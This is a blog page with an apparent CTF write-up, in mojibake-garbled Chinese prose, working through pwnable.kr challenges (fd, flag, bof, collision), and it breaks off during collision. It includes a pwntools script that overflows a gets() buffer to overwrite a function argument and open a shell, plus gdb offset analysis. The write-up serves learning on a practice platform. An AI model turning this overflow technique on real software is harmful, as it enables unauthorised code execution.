<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>pwnable.kr | Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="åˆ†æpwnable.krï¼ˆå’Œtwï¼‰ä¸Šçš„é¢˜ç³»åˆ—  fdsshä¸ŠæœåŠ¡å™¨ï¼Œçœ‹åˆ°æºä»£ç ï¼Œæ²¡å¿…è¦ä¸‹è½½ï¼Œç›´æ¥çœ‹cæ–‡ä»¶å°±è¡Œ 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char*">
<meta property="og:type" content="article">
<meta property="og:title" content="pwnable.kr">
<meta property="og:url" content="http://example.com/2019/06/25/2019-06-25-kr_1st/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="åˆ†æpwnable.krï¼ˆå’Œtwï¼‰ä¸Šçš„é¢˜ç³»åˆ—  fdsshä¸ŠæœåŠ¡å™¨ï¼Œçœ‹åˆ°æºä»£ç ï¼Œæ²¡å¿…è¦ä¸‹è½½ï¼Œç›´æ¥çœ‹cæ–‡ä»¶å°±è¡Œ 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char*">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2019-06-24T16:00:00.000Z">
<meta property="article:modified_time" content="2023-08-07T18:15:52.000Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">

<meta name="generator" content="Hexo 8.0.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-2019-06-25-kr_1st" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/06/25/2019-06-25-kr_1st/" class="article-date">
  <time class="dt-published" datetime="2019-06-24T16:00:00.000Z" itemprop="datePublished">2019-06-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="p-name article-title" itemprop="headline name">
      pwnable.kr
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <blockquote>
<p>åˆ†æpwnable.krï¼ˆå’Œtwï¼‰ä¸Šçš„é¢˜ç³»åˆ—</p>
</blockquote>
<h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><p>sshä¸ŠæœåŠ¡å™¨ï¼Œçœ‹åˆ°æºä»£ç ï¼Œæ²¡å¿…è¦ä¸‹è½½ï¼Œç›´æ¥çœ‹cæ–‡ä»¶å°±è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">char buf[32];</span><br><span class="line">int main(int argc, char* argv[], char* envp[])&#123;</span><br><span class="line">	if(argc&lt;2)&#123;</span><br><span class="line">		printf(&quot;pass argv[1] a number\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	int fd = atoi( argv[1] ) - 0x1234;</span><br><span class="line">	int len = 0;</span><br><span class="line">	len = read(fd, buf, 32);</span><br><span class="line">	if(!strcmp(&quot;LETMEWIN\n&quot;, buf))&#123;</span><br><span class="line">		printf(&quot;good job :)\n&quot;);</span><br><span class="line">		system(&quot;/bin/cat flag&quot;);</span><br><span class="line">		exit(0);</span><br><span class="line">	&#125;</span><br><span class="line">	printf(&quot;learn about Linux file IO\n&quot;);</span><br><span class="line">	return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ¬é¢˜å°±æ˜¯æŠŠ<code>int fd = atoi( argv[1] ) - 0x1234;</code>ä¸­çš„<strong>fd</strong>ææˆ0å³å¯ï¼Œè®©åè¾¹çš„readå‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ ‡å‡†è¾“å…¥0å³å¯ï¼Œ0x1234-&gt;4660ï¼Œç„¶åå†è¾“<code>LETMEWIN</code>å°±æå®šäº†ğŸ¤£ï¼Œè¿™é‡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fd@prowl:~$ ./fd</span><br><span class="line">pass argv[1] a number</span><br><span class="line">fd@prowl:~$ ./fd 4660</span><br><span class="line">LETMEWIN</span><br><span class="line">good job :)</span><br><span class="line">mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure>
<h2 id="mainå‚æ•°"><a href="#mainå‚æ•°" class="headerlink" title="mainå‚æ•°"></a>mainå‚æ•°</h2><p>æœ¬é¢˜åˆ†æä¸€ä¸‹mainå‡½æ•°å‚æ•°<strong>argc</strong>ï¼ˆå‚æ•°ä¸ªæ•°ï¼‰ï¼Œ<strong>angv</strong>ï¼ˆå‚æ•°ï¼Œå½“æˆæ•°ç»„å­˜å‚¨ï¼‰ï¼Œ<strong>envp</strong>ï¼ˆç¯å¢ƒå˜é‡ï¼‰</p>
<p>ä¹±å†™äº†ä¸€å †ä»£ç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main(int argc, char* argv[], char* envp[])&#123;</span><br><span class="line">printf(&quot;%d\n&quot;,argc);</span><br><span class="line"></span><br><span class="line">for(int i = 0;;i++)</span><br><span class="line">	if(argv[i])</span><br><span class="line">	printf(&quot;%s\n&quot;,argv[i]);</span><br><span class="line">	</span><br><span class="line">for(int i = 0;;i++)</span><br><span class="line">	if(envp[i])</span><br><span class="line">	printf(&quot;%s\n&quot;,envp[i]);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿è¡Œä¸€éå¯ä»¥çœ‹çœ‹å…·ä½“çš„å«ä¹‰ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºå•¥æœ€åè¾“å‡ºç¯å¢ƒå˜é‡æ—¶ä¼š<code>Segmentation fault (core dumped)</code>ï¼Œå¾ˆè¿·ï¼Œè¿™é‡ŒåŸ‹ä¸ªä¼ç¬”å§ï¼Œè§‰å¾—æ˜¯ç¯å¢ƒå˜é‡è®¿é—®è¶Šç•Œï¼Œæœ‰çŸ¥é“çš„å¤§ä½¬å¸Œæœ›èƒ½æŒ‡ç‚¹ä¸€ä¸‹æœ¬èœé¸¡</p>
<h2 id="atoi"><a href="#atoi" class="headerlink" title="atoi"></a>atoi</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">   int val;</span><br><span class="line">   char str[20];</span><br><span class="line">   strcpy(str, &quot;98993489&quot;);</span><br><span class="line">   val = atoi(str);</span><br><span class="line">   printf(&quot;String value = %s, Int value = %d\n&quot;, str, val);</span><br><span class="line">   strcpy(str, &quot;123\n254g9i0sd235.net&quot;);</span><br><span class="line">   val = atoi(str);</span><br><span class="line">   printf(&quot;String value = %s, Int value = %d\n&quot;, str, val);</span><br><span class="line">   return(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç»“æœ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop$ ./real</span><br><span class="line">String value = 98993489, Int value = 98993489</span><br><span class="line">String value = 123</span><br><span class="line">254g9i0sd235.net, Int value = 123</span><br></pre></td></tr></table></figure>

<h2 id="read"><a href="#read" class="headerlink" title="read"></a>read</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">char buf[32];</span><br><span class="line">int main(int argc, char* argv[], char* envp[])&#123;</span><br><span class="line">	int len = 0;</span><br><span class="line">for(int i = -1;i &lt; 5;i++)&#123;</span><br><span class="line">	len = read(i, buf, 32);</span><br><span class="line">	printf(&quot;%d:%s&quot;,i,buf);&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop$ ./real</span><br><span class="line">q</span><br><span class="line">-1:0:q</span><br><span class="line">w</span><br><span class="line">1:w</span><br><span class="line">e</span><br><span class="line">2:e</span><br><span class="line">3:e</span><br><span class="line">4:e</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°-1çš„æ—¶å€™readå‡½æ•°æ²¡æœ‰å‘ç”Ÿä»€ä¹ˆè€Œä¸”æŠŠæ ‡å‡†è¾“å…¥çš„ä½ç½®ç»™å äº†ï¼Œ1ï¼Œ2éƒ½æ˜¯æ­£å¸¸çš„è¾“å…¥ï¼Œåˆ°3çš„æ—¶å€™å°±ä¸å¤„ç†äº†ï¼Œç›´æ¥è¾“å‡º</p>
<p>æˆ‘ä»¬çœ‹ä¸€çœ‹åˆ°åº•æˆåŠŸæ²¡æœ‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">char buf[32];</span><br><span class="line">int main(int argc, char* argv[], char* envp[])&#123;</span><br><span class="line">	int len = 0;</span><br><span class="line">for(int i = -1;i &lt; 5;i++)&#123;</span><br><span class="line">	len = read(i, buf, 32);</span><br><span class="line">	printf(&quot;%d time:%s and the len is %d&quot;,i,buf,len);</span><br><span class="line">	printf(&quot;\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop$ ./real </span><br><span class="line">-1 time: and the len is -1</span><br><span class="line">q</span><br><span class="line">0 time:q</span><br><span class="line"> and the len is 2</span><br><span class="line">w</span><br><span class="line">1 time:w</span><br><span class="line"> and the len is 2</span><br><span class="line">e</span><br><span class="line">2 time:e</span><br><span class="line"> and the len is 2</span><br><span class="line">3 time:e</span><br><span class="line"> and the len is -1</span><br><span class="line">4 time:e</span><br><span class="line"> and the len is -1</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡çœ‹ä¸Šè¾¹çš„ä»£ç å’Œç»“æœæˆ‘ä»¬ç®€å•æ€»ç»“ä¸€ä¸‹<strong>read</strong>å‡½æ•°</p>
<ul>
<li><code>\n</code>ä¹Ÿä¼šè¢«å½“ä½œè¾“å…¥</li>
<li>è¿”å›å€¼ä¸ºè¾“å…¥é•¿åº¦ï¼Œå‘ç”Ÿé”™è¯¯è¿”å›-1</li>
<li>-1çš„æƒ…å†µä¸å¤ªä¸€æ ·ï¼Œå’Œè¾“å…¥è¯­å¢ƒæœ‰å…³ç³»ï¼Ÿï¼Ÿ</li>
</ul>
<blockquote>
<p>æ·±å…¥åˆ†æpwnable.krä¸Šçš„é¢˜ç³»åˆ—[äºŒ]</p>
</blockquote>
<p>å…ˆçœ‹è¿™ä¸ªé€†å‘</p>
<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>æœ‰upxå£³ï¼Œç›´æ¥è„±äº†ï¼Œå‘ç°<code>checksec</code>å¯ä»¥ç›´æ¥çœ‹å£³å­ï¼Œå¥½å¼ºå•Šï¼Œè†œä¸€ä¸‹è¿™ä¸ªç¥å™¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop$ checksec flag</span><br><span class="line">[*] &#x27;/home/pic/Desktop/flag&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">    Packer:   Packed with UPX</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char *dest; // ST08_8</span><br><span class="line"></span><br><span class="line">  puts(&quot;I will malloc() and strcpy the flag there. take it.&quot;, argv, envp);</span><br><span class="line">  dest = malloc(100LL);</span><br><span class="line">  strcpy(dest, flag);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>idaåç¼–è¯‘ç»“æœï¼Œæ„æ€æ˜¯æˆ‘mallocä¸€å—ç„¶åæŠŠflagèµ‹å€¼åˆ°é‡Œè¾¹ï¼Œç„¶åç›´æ¥çœ‹<strong>flag</strong>å°±å®Œäº‹äº†</p>
<p>è¿™é¢˜æºä»£ç å·®ä¸å¤šé•¿è¿™æ ·</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">char *flag = &quot;haha&quot;;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  char *dest; </span><br><span class="line">  printf(&quot;I will malloc() and strcpy the flag there. take it.&quot;);</span><br><span class="line">  dest = malloc(100);</span><br><span class="line">  strcpy(dest, flag);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h2><p>é¢˜ç›®ç»™çš„cæ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">void func(int key)&#123;</span><br><span class="line">	char overflowme[32];</span><br><span class="line">	printf(&quot;overflow me : &quot;);</span><br><span class="line">	gets(overflowme);	// smash me!</span><br><span class="line">	if(key == 0xcafebabe)&#123;</span><br><span class="line">		system(&quot;/bin/sh&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		printf(&quot;Nah..\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">	func(0xdeadbeef);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬çœ‹åˆ°å¿…é¡»è®©<strong>key</strong>å˜æˆ<code>0xcafebabe</code>æˆ‘ä»¬çŸ¥é“è°ƒç”¨å‡½æ•°æ—¶ç¨‹åºæŠŠå‚æ•°å…¥æ ˆæˆ‘ä»¬åªéœ€è¦è®©<code>overflowme</code>è¿™ä¸ªå±€éƒ¨å˜é‡æº¢å‡ºå³å¯ï¼Œä¸‹é¢ç”¨ä¸¤ä¸ªå·¥å…·idaå’Œgdbè°ƒè¯•æä¸€ä¸‹</p>
<h3 id="æ–¹æ³•ä¸€ï¼šida"><a href="#æ–¹æ³•ä¸€ï¼šida" class="headerlink" title="æ–¹æ³•ä¸€ï¼šida"></a>æ–¹æ³•ä¸€ï¼šida</h3><p>çœ‹åˆ°keyçš„ä½ç½®åœ¨<code>ebp+8</code>ï¼Œè€Œ<code>char s; // [esp+1Ch] [ebp-2Ch]</code>ï¼Œä¸¤è€…ç›¸å·®52å­—èŠ‚ï¼Œexpå¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./bof&#x27;)</span><br><span class="line">p.recvuntil(&#x27;overflow me : \n&#x27;)</span><br><span class="line">p.sendline(&#x27;a&#x27;*52+p32(0xcafebabe))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pic@ubuntu:~/Desktop$ python exp.py </span><br><span class="line">[+] Starting local process &#x27;./bof&#x27;: pid 46987</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ id</span><br><span class="line">uid=1000(pic) gid=1000(pic) groups=1000(pic),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)</span><br></pre></td></tr></table></figure>
<p>æ€»æ˜¯æ„Ÿè§‰è¿™ç§æ–¹æ³•ä¸å¤ªä¼˜é›…ï¼Œä¸‹é¢è¯´ä¸€ä¸‹gdbç¥å™¨</p>
<h3 id="æ–¹æ³•äºŒï¼šgdb"><a href="#æ–¹æ³•äºŒï¼šgdb" class="headerlink" title="æ–¹æ³•äºŒï¼šgdb"></a>æ–¹æ³•äºŒï¼šgdb</h3><p>ç›´æ¥<code>s</code>æ­¥å…¥<code>func</code>é‡Œï¼Œåˆ°æ¯”è¾ƒçš„åœ°æ–¹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x56555654 &lt;func+40&gt;    cmp    dword ptr [ebp + 8], 0xcafebabe</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; print $ebp</span><br><span class="line">$1 = (void *) 0xffffd1d8</span><br><span class="line">pwndbg&gt; x/16gx 0xffffd1d8+8</span><br><span class="line">0xffffd1e0:	0x00000000deadbeef	0x00000000565556b9</span><br><span class="line">0xffffd1f0:	0xf7fb6000f7fb6000	0xf7df6e8100000000</span><br><span class="line">0xffffd200:	0xffffd29400000001	0xffffd224ffffd29c</span><br><span class="line">0xffffd210:	0x0000000000000001	0xf7fe575af7fb6000</span><br><span class="line">0xffffd220:	0x00000000f7ffd000	0x00000000f7fb6000</span><br><span class="line">0xffffd230:	0x40c4cae300000000	0x0000000001bc4cf3</span><br><span class="line">0xffffd240:	0x0000000000000000	0x5655553000000001</span><br><span class="line">0xffffd250:	0xf7feae2000000000	0x56556ff4f7fe59b0</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬çœ‹åˆ°äº†<code>0xdeadbeef</code>è¦å’Œ<code>0xcafebabe</code>æ¯”è¾ƒï¼Œæˆ‘ä»¬éœ€è¦è¦†ç›–è¿™ä¸ªå€¼ï¼Œæ‰¾ä¸€ä¸‹åç§»é‡</p>
<p>çœ‹ä¸€ä¸‹<code>gets</code>å‡½æ•°å‚æ•°ï¼Œå³<strong>overflowme</strong>åœ°å€ï¼Œæ‰¾åˆ°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x56555649 &lt;func+29&gt;    lea    eax, [ebp - 0x2c]</span><br><span class="line">0x5655564c &lt;func+32&gt;    mov    dword ptr [esp], eax</span><br><span class="line">0x5655564f &lt;func+35&gt;    call   gets &lt;0xf7e452b0&gt;</span><br></pre></td></tr></table></figure>
<p>eaxå€¼ä¸º<code>0xffffd1ac</code>ï¼Œç„¶åæ¯”è¾ƒä¸€æ³¢</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance 0xffffd1ac 0xffffd1d8+8</span><br><span class="line">0xffffd1ac-&gt;0xffffd1e0 is 0x34 bytes (0xd words)</span><br></pre></td></tr></table></figure>
<p>åç§»é‡ä¹Ÿä¸º0x34ï¼Œç»“æŸæˆ˜æ–—</p>
<h2 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h2><p>è¿™é¢˜ä¸»è¦çš„æ˜¯ç†è§£é¢˜ç›®æ‰€ç»™å‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">unsigned long hashcode = 0x21DD09EC;</span><br><span class="line">unsigned long check_password(const char* p)&#123;</span><br><span class="line">	int* ip = (int*)p;</span><br><span class="line">	int i;</span><br><span class="line">	int res=0;</span><br><span class="line">	for(i=0; i&lt;5; i++)&#123;</span><br><span class="line">		res += ip[i];</span><br><span class="line">	&#125;</span><br><span class="line">	return res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">	if(argc&lt;2)&#123;</span><br><span class="line">		printf(&quot;usage : %s [passcode]\n&quot;, argv[0]);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	if(strlen(argv[1]) != 20)&#123;</span><br><span class="line">		printf(&quot;passcode length should be 20 bytes\n&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if(hashcode == check_password( argv[1] ))&#123;</span><br><span class="line">		system(&quot;/bin/cat flag&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">		printf(&quot;wrong passcode.\n&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬çœ‹åˆ°ç¨‹åºè®©æˆ‘ä»¬è¾“å…¥ç¬¬äºŒä¸ªå‚æ•°ï¼Œä¸”å‚æ•°é•¿åº¦ä¸º20ï¼Œç„¶åè·³åˆ°<code>check_password</code>å‡½æ•°ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°å®ƒæŠŠcharæŒ‡é’ˆè½¬æˆäº†intæŒ‡é’ˆï¼Œæ‰€ä»¥æ¯æ¬¡åŠ ä¸€éƒ½æˆäº†åŠ å››ï¼Œè®©20ä¸ªè¾“å…¥çš„å­—ç¬¦ç»è¿‡é€ä¸ªç›¸åŠ å¾—åˆ°ç‰¹å®šå€¼å³å¯ï¼Œç½‘ä¸Šæ‰¾äº†æ‰¾æ€è·¯ï¼Œå¤§è‡´éƒ½æ˜¯å…ˆç®—ï¼Œç„¶åç”¨<code>echo</code>æˆ–<code>python</code>è¾“å…¥å­—èŠ‚ï¼Œç„¶åå‘ç°ä¸€ä¸ªå¤§ä½¬æŠŠç‰¹å®šå­—ç¬¦ç»™æå‡ºæ¥äº†</p>
